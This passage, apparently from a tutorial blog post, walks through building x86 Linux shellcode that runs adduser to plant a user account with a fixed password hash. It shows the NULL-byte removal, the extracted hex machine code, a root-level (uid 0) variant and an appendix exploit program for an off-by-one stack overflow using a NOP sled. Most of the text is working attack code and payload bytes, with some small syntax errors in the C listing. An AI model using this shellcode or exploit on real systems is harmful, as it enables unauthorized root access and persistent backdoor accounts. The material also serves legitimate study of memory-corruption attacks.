	<span class="nf">leal</span> <span class="mh">0x7D</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">edx</span>  <span class="err">#</span> <span class="nv">Address</span> <span class="nv">of</span> <span class="nv">null</span> <span class="nv">pointer</span> <span class="nv">to</span> <span class="nb">EDX</span>
	<span class="nf">int</span> <span class="kc">$</span><span class="mh">0x80</span>             <span class="err">#</span> <span class="nv">Trigger</span> <span class="nv">Interrupt</span>
	<span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>        <span class="err">#</span> <span class="nv">Begin</span> <span class="nv">of</span> <span class="nv">Error</span> <span class="nv">Handling</span>
	<span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>
	<span class="nf">int</span> <span class="kc">$</span><span class="mh">0x80</span>
<span class="nl">data:</span>
	<span class="nf">call</span> <span class="nv">start</span>            <span class="err">#</span> <span class="nv">Put</span> <span class="nv">base</span> <span class="nv">address</span> <span class="nv">of</span> <span class="nv">Strings</span> <span class="nv">on</span> <span class="nv">the</span> <span class="nv">Stack</span>
<span class="nf">.string</span> <span class="err">\"</span><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">sbin</span><span class="o">/</span><span class="nv">adduser#markus#</span><span class="o">-</span><span class="nv">p#$1$7</span><span class="err">Ï</span><span class="nv">v</span><span class="err">Ù</span><span class="nv">LK</span><span class="err">Ïµ</span><span class="kc">$</span><span class="nb">gS</span><span class="nv">UKG6RALzRA8ryROcTsG0#</span><span class="err">\"</span></code></pre></figure> <p></p> <p>When placing the strings, remember that an extra byte is needed to mark the end of each string. In this example, the <code class="language-plaintext highlighter-rouge">#</code> character is used as a placeholder for the string terminator.</p> <p>However, when testing this code, you might notice that the C function <code class="language-plaintext highlighter-rouge">strcpy()</code> does not copy the entire code into the overflow buffer. The reason is straightforward: There are <strong>NULL bytes</strong> present in the code. Since <code class="language-plaintext highlighter-rouge">strcpy()</code> stops copying as soon as it encounters a <code class="language-plaintext highlighter-rouge">\0</code>, any subsequent code is ignored. This effectively renders the code unusable.</p> <p>To solve this problem, <strong>all NULL bytes must be removed</strong>. But because the strings themselves require termination bytes, a different approach must be used. Here, an important principle from Boolean algebra becomes relevant:</p> \[x \nleftrightarrow x = 0\] <p>Therefore, a register can be set to zero with a simple XOR operation and then written to the corresponding memory locations. This changes the code as follows:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">jmp</span> <span class="nv">data</span>
<span class="nl">start:</span>
	<span class="nf">popl</span> <span class="o">%</span><span class="nb">esi</span>             <span class="err">#</span> <span class="nv">Base</span> <span class="nv">Address</span> <span class="nv">der</span> <span class="nv">Strings</span> <span class="nv">vom</span> <span class="nv">Stack</span> <span class="nv">holen</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">esi</span><span class="p">,</span><span class="mi">63</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> 		
	<span class="nf">leal</span> <span class="mi">18</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">67</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>			
	<span class="nf">leal</span> <span class="mi">25</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">71</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>		
	<span class="nf">leal</span> <span class="mi">28</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">75</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">xorl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>        <span class="err">#</span> <span class="nv">Null</span> <span class="nv">the</span> <span class="nb">EAX</span> <span class="nv">register</span>		
	<span class="nf">movb</span> <span class="o">%</span><span class="nb">al</span><span class="p">,</span><span class="mi">17</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>     <span class="err">#</span> <span class="nv">Termination</span> <span class="nv">of</span> <span class="nv">the</span> <span class="nv">Strings</span> <span class="p">(</span><span class="nv">one</span> <span class="kt">byte</span> <span class="nv">each</span><span class="p">)</span>
	<span class="nf">movb</span> <span class="o">%</span><span class="nb">al</span><span class="p">,</span><span class="mi">24</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">movb</span> <span class="o">%</span><span class="nb">al</span><span class="p">,</span><span class="mi">27</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">movb</span> <span class="o">%</span><span class="nb">al</span><span class="p">,</span><span class="mi">62</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">79</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>    <span class="err">#</span> <span class="nv">NULL</span><span class="o">-</span><span class="nv">Pointer</span> <span class="nv">at</span> <span class="nv">end</span> <span class="nv">of</span> <span class="nv">pointer</span> <span class="nv">list</span>
	<span class="nf">movb</span> <span class="kc">$</span><span class="mh">0xb</span><span class="p">,</span><span class="o">%</span><span class="nb">al</span>         <span class="err">#</span> <span class="nv">Code</span> <span class="nv">of</span> <span class="nv">SysCall</span><span class="o">-</span><span class="nv">table</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">esi</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>        <span class="err">#</span> <span class="nv">Address</span> <span class="nv">of</span> <span class="nv">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
	<span class="nf">leal</span> <span class="mi">63</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">ecx</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="p">[</span><span class="nv">A</span><span class="p">]</span> <span class="nv">to</span> <span class="nb">ECX</span> <span class="p">(</span><span class="nv">name</span><span class="p">[])</span>
	<span class="nf">leal</span> <span class="mi">79</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">edx</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">of</span> <span class="nv">null</span> <span class="nv">pointer</span> <span class="nv">to</span> <span class="nb">EDX</span>
	<span class="nf">int</span> <span class="kc">$</span><span class="mh">0x80</span>             <span class="err">#</span> <span class="nv">Trigger</span> <span class="nv">Interrupt</span>
	<span class="nf">xorl</span> <span class="o">%</span><span class="nb">ebx</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>	      <span class="err">#</span> <span class="nv">Begin</span> <span class="nv">of</span> <span class="nv">Error</span> <span class="nv">Handling</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">ebx</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
	<span class="nf">inc</span> <span class="o">%</span><span class="nb">eax</span>
	<span class="nf">int</span> <span class="kc">$</span><span class="mh">0x80</span>
<span class="nl">data:</span>
	<span class="nf">call</span> <span class="nv">start</span>            <span class="err">#</span> <span class="nv">Put</span> <span class="nv">base</span> <span class="nv">address</span> <span class="nv">of</span> <span class="nv">Strings</span> <span class="nv">on</span> <span class="nv">the</span> <span class="nv">Stack</span>
<span class="nf">.string</span> <span class="err">\"</span><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">sbin</span><span class="o">/</span><span class="nv">adduser#markus#</span><span class="o">-</span><span class="nv">p#$1$7</span><span class="err">Ï</span><span class="nv">v</span><span class="err">Ù</span><span class="nv">LK</span><span class="err">Ïµ</span><span class="kc">$</span><span class="nb">gS</span><span class="nv">UKG6RALzRA8ryROcTsG0#</span><span class="err">\"</span></code></pre></figure> <p></p> <h2 id="assembling-the-program-and-extracting-the-machine-code">Assembling the program and extracting the machine code</h2> <p>After assembly, the machine code can be read out using the GDB debugger. This should be used next to create an exploit. The size of the code is exactly 128 bytes.</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
	<span class="s">"</span><span class="se">\xeb\x3a\x5e\x89\x76\x3f\x8d\x46</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x12\x89\x46\x43\x8d\x46\x19\x89</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x46\x47\x8d\x46\x1c\x89\x46\x4b</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x31\xc0\x88\x46\x11\x88\x46\x18</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x88\x46\x1b\x88\x46\x3e\x89\x46</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x4f\xb0\x0b\x89\xf3\x8d\x4e\x3f</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x8d\x56\x4f\xcd\x80\x31\xdb\x89</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xd8\x40\xcd\x80\xe8\xc1\xff\xff</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xff\x2f\x75\x73\x72\x2f\x73\x62</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x69\x6e\x2f\x61\x64\x64\x75\x73</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x65\x72\x23\x6d\x61\x72\x6b\x75</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x73\x23\x2d\x70\x23\x24\x31\x24</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x37\xcf\x76\xd9\x4c\x4b\xcf\xb5</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x24\x67\x53\x55\x4b\x47\x36\x52</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x41\x4c\x7a\x52\x41\x38\x72\x79</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x52\x4f\x63\x54\x73\x47\x30\x23</span><span class="s">"</span><span class="p">;</span></code></pre></figure> <p></p> <h2 id="creating-a-fully-functional-exploit">Creating a fully Functional Exploit</h2> <p>The goal of this exploit is to overflow the vulnerable program’s 512-byte buffer while making optimal use of the available space. Since our shellcode is only 128 bytes long, we have over 384 remaining bytes to occupy—an ideal scenario for implementing a <strong>NOP-sled</strong>. Additionally, we need to estimate the payload’s address so we can overwrite the function’s return address successfully.</p> <p>Given that the payload address is only a rough approximation, using a sufficiently large NOP region increases the likelihood of landing within that region and subsequently executing the shellcode. We will not discuss the C program that generates the exploit here, but you can find extensively documented source code on GitHub.</p> <p>Up to this point, our shellcode only creates a non-privileged user named <strong>markus</strong>. To create a <strong>root-privileged</strong> user, we would need an extended parameter list for the <code class="language-plaintext highlighter-rouge">useradd</code> program. The shellcode’s overall structure remains the same, so we will not delve into additional details; the code is simply listed below:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="err">`</span><span class="n">main</span><span class="p">()</span><span class="err">`</span> <span class="p">{</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">[</span><span class="mi">9</span><span class="p">];</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/usr/sbin/adduser"</span><span class="p">;</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span><span class="s">"-u"</span><span class="p">;</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s">"0"</span><span class="p">;</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="s">"-g"</span><span class="p">;</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="s">"root"</span><span class="p">;</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="s">"-p"</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="s">"$1$7ÏvÙLKÏµ$gSUKG6RALzRA8ryROcTsG0;</span><span class="err">
</span><span class="s">   name[7] = "</span><span class="n">rut</span><span class="s">";</span><span class="err">
</span><span class="s">   name[8] = NULL;</span><span class="err">
</span><span class="s">   execve(name[0], name, NULL);</span><span class="err">
</span><span class="s">}</span></code></pre></figure> <p> which leads to the following machine code:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">char</span> <span class="kt">byte</span><span class="nv">Code</span><span class="p">[]</span> <span class="err">=</span>
	<span class="err">"\</span><span class="nf">xeb</span><span class="err">\</span><span class="nv">x67</span><span class="err">\</span><span class="nv">x5e</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x76</span><span class="err">\</span><span class="nv">x4c</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x12</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x50</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x15</span><span class="err">\</span><span class="nv">x89</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x54</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x17</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x58</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x1a</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x5c</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x1d</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x60</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x22</span><span class="err">\</span><span class="nv">x89</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x64</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x25</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x68</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x48</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x6c</span><span class="err">\</span><span class="nv">x31</span><span class="err">\</span><span class="nv">xc0</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x11</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x14</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x16</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x19</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x1c</span><span class="err">\</span><span class="nv">x88</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x21</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x24</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x47</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x4b</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x70</span><span class="err">\</span><span class="nv">xb0</span><span class="err">\</span><span class="nv">x0b</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">xf3</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x4e</span><span class="err">\</span><span class="nv">x4c</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x56</span><span class="err">\</span><span class="nv">x70</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">xcd</span><span class="err">\</span><span class="nv">x80</span><span class="err">\</span><span class="nv">x31</span><span class="err">\</span><span class="nv">xdb</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">xd8</span><span class="err">\</span><span class="nv">x40</span><span class="err">\</span><span class="nv">xcd</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x80</span><span class="err">\</span><span class="nv">xe8</span><span class="err">\</span><span class="nv">x94</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">x2f</span><span class="err">\</span><span class="nv">x75</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x73</span><span class="err">\</span><span class="nv">x72</span><span class="err">\</span><span class="nv">x2f</span><span class="err">\</span><span class="nv">x73</span><span class="err">\</span><span class="nv">x62</span><span class="err">\</span><span class="nv">x69</span><span class="err">\</span><span class="nv">x6e</span><span class="err">\</span><span class="nv">x2f</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x61</span><span class="err">\</span><span class="nv">x64</span><span class="err">\</span><span class="nv">x64</span><span class="err">\</span><span class="nv">x75</span><span class="err">\</span><span class="nv">x73</span><span class="err">\</span><span class="nv">x65</span><span class="err">\</span><span class="nv">x72</span><span class="err">\</span><span class="nv">x23</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x2d</span><span class="err">\</span><span class="nv">x75</span><span class="err">\</span><span class="nv">x23</span><span class="err">\</span><span class="nv">x30</span><span class="err">\</span><span class="nv">x23</span><span class="err">\</span><span class="nv">x2d</span><span class="err">\</span><span class="nv">x6f</span><span class="err">\</span><span class="nv">x23</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x2d</span><span class="err">\</span><span class="nv">x67</span><span class="err">\</span><span class="nv">x23</span><span class="err">\</span><span class="nv">x72</span><span class="err">\</span><span class="nv">x6f</span><span class="err">\</span><span class="nv">x6f</span><span class="err">\</span><span class="nv">x74</span><span class="err">\</span><span class="nv">x23</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x2d</span><span class="err">\</span><span class="nv">x70</span><span class="err">\</span><span class="nv">x23</span><span class="err">\</span><span class="nv">x24</span><span class="err">\</span><span class="nv">x31</span><span class="err">\</span><span class="nv">x24</span><span class="err">\</span><span class="nv">x37</span><span class="err">\</span><span class="nv">xcf</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x76</span><span class="err">\</span><span class="nv">xd9</span><span class="err">\</span><span class="nv">x4c</span><span class="err">\</span><span class="nv">x4b</span><span class="err">\</span><span class="nv">xcf</span><span class="err">\</span><span class="nv">xb5</span><span class="err">\</span><span class="nv">x24</span><span class="err">\</span><span class="nv">x67</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x53</span><span class="err">\</span><span class="nv">x55</span><span class="err">\</span><span class="nv">x4b</span><span class="err">\</span><span class="nv">x47</span><span class="err">\</span><span class="nv">x36</span><span class="err">\</span><span class="nv">x52</span><span class="err">\</span><span class="nv">x41</span><span class="err">\</span><span class="nv">x4c</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x7a</span><span class="err">\</span><span class="nv">x52</span><span class="err">\</span><span class="nv">x41</span><span class="err">\</span><span class="nv">x38</span><span class="err">\</span><span class="nv">x72</span><span class="err">\</span><span class="nv">x79</span><span class="err">\</span><span class="nv">x52</span><span class="err">\</span><span class="nv">x4f</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x63</span><span class="err">\</span><span class="nv">x54</span><span class="err">\</span><span class="nv">x73</span><span class="err">\</span><span class="nv">x47</span><span class="err">\</span><span class="nv">x30</span><span class="err">\</span><span class="nv">x23</span><span class="err">\</span><span class="nv">x72</span><span class="err">\</span><span class="nv">x75</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x74</span><span class="err">\</span><span class="nv">x23</span><span class="err">"</span><span class="c1">;</span></code></pre></figure> <p></p> <h1 id="appendix">Appendix</h1> <h2 id="example-for-off-by-ones-overflows">Example for Off-By-Ones Overflows</h2> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/errno.h&gt;</span><span class="cp">
</span>
<span class="cp">#define DEFAULT_OFFSET  500 - 32
#define DEFAULT_BUFFER  521
#define NOP             0x90
</span>
<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
    <span class="s">"</span><span class="se">\xeb\x3a\x5e\x89\x76\x3f\x8d\x46</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x12\x89\x46\x43\x8d\x46\x19\x89</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x46\x47\x8d\x46\x1c\x89\x46\x4b</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x31\xc0\x88\x46\x11\x88\x46\x18</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x88\x46\x1b\x88\x46\x3e\x89\x46</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x4f\xb0\x0b\x89\xf3\x8d\x4e\x3f</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x8d\x56\x4f\xcd\x80\x31\xdb\x89</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xd8\x40\xcd\x80\xe8\xc1\xff\xff</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xff\x2f\x75\x73\x72\x2f\x73\x62</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x69\x6e\x2f\x61\x64\x64\x75\x73</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x65\x72\x23\x6d\x61\x72\x6b\x75</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x73\x23\x2d\x70\x23\x24\x31\x24</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x37\xcf\x76\xd9\x4c\x4b\xcf\xb5</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x24\x67\x53\x55\x4b\x47\x36\x52</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x41\x4c\x7a\x52\x41\x38\x72\x79</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x52\x4f\x63\x54\x73\x47\x30\x23</span><span class="s">"</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">getESP</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">__asm__</span><span class="p">(</span><span class="s">"movl %esp,%eax"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">calc</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">bb</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="c1">// Because too much memory is allocated (GCC bug),</span>
    <span class="c1">// let the loop run a bit further. Even so, only</span>
    <span class="c1">// the lower byte of the saved frame pointer (SFP) is overwritten!!!</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">520</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">bb</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>

    <span class="n">bb</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">bb</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">calctmp</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// The call does not happen directly from main,</span>
    <span class="c1">// but via an intermediate function. Why???</span>
    <span class="c1">// The SFP in main is too large and therefore cannot be reached.</span>
    <span class="c1">// Check whether this might be related to argc, argv, and envp.</span>
    <span class="c1">// char arr[33];</span>
    <span class="n">calc</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="c1">// char dummy[1];</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">DEFAULT_OFFSET</span><span class="p">,</span> <span class="n">buffs</span> <span class="o">=</span> <span class="n">DEFAULT_BUFFER</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>
    <span class="kt">long</span> <span class="n">adr</span><span class="p">,</span> <span class="o">*</span><span class="n">adr_pointer</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">offset</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

    <span class="n">buff</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">buffs</span><span class="p">);</span>    <span class="c1">// Reserve memory on the heap</span>

    <span class="n">adr</span> <span class="o">=</span> <span class="n">getESP</span><span class="p">()</span> <span class="o">-</span> <span class="n">offset</span><span class="p">;</span>
    <span class="n">tmp</span> <span class="o">=</span> <span class="n">buff</span><span class="p">;</span>
    <span class="n">adr_pointer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>  <span class="c1">// +1 because the stack is set up incorrectly</span>

    <span class="c1">// Fill the entire buffer with the suspected address</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">buffs</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">)</span>
        <span class="o">*</span><span class="p">(</span><span class="n">adr_pointer</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">adr</span><span class="p">;</span>

    <span class="c1">// Fill the first half with NOPs</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">buffs</span><span class="o">/</span><span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">NOP</span><span class="p">;</span>

    <span class="n">tmp</span> <span class="o">=</span> <span class="n">buff</span> <span class="o">+</span> <span class="p">((</span><span class="n">buffs</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">));</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
